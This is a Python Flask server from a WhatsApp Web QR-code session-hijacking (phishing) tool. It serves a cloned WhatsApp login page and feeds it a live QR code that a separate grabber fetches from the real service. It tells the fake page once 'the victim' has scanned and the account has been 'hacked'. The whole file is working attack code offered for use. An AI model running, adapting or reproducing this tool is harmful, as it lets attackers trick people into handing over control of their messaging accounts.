import base64
import os

from flask import Flask, request, render_template, send_from_directory

app = Flask(__name__)


def get_png_b64():  # here we encode the qr.png image to base64
    with open('qr.png', 'rb') as f:
        png_bytes = f.read()
    png_b64 = base64.encodebytes(png_bytes)
    return png_b64


# just to serve static files, so we don't need to setup a server like nginx
@app.route('/WhatsApp_files/<path:path>')
def send_static(path):
    return send_from_directory('WhatsApp_files', path)


@app.route('/')
def index():
    return render_template("WhatsApp.html")  # here goes the clone website. See WhatsApp_files/qreload.js


@app.route('/get-qr/')
def get_qr():
    """
    Every second the webpage will ask the server the qr code (that gets updated by the grabber)
    :return: qr code encoded in base64 or 'hacked'
    """
    if request.method == 'GET':
        if not os.path.isfile('hacked'):  # if there is no hacked file, the victim still has to scan
            return get_png_b64()
        else:  # else, the victim scanned the qr code. We tell so to the cloned website
            print('hacked')
            return 'hacked'


if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=80)